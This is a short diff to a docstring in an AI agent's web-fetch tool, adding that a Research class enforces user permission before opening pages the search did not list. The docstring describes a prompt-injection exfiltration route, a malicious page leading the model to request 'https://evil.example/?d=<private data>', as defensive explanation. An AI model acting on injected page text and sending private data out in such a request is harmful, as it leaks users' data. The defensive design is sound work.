@@ -9,7 +9,8 @@ voicemate.agent.tools.fetch
 
    A page that the user's search did not list is opened only with the user's permission: a
    malicious page could otherwise make the model request ``https://evil.example/?d=<private
-   data>`` and so carry data out in the address.
+   data>`` and so carry data out in the address. :class:`~voicemate.agent.tools.research.Research`
+   enforces that; this tool supplies the question to ask.
 
 
 
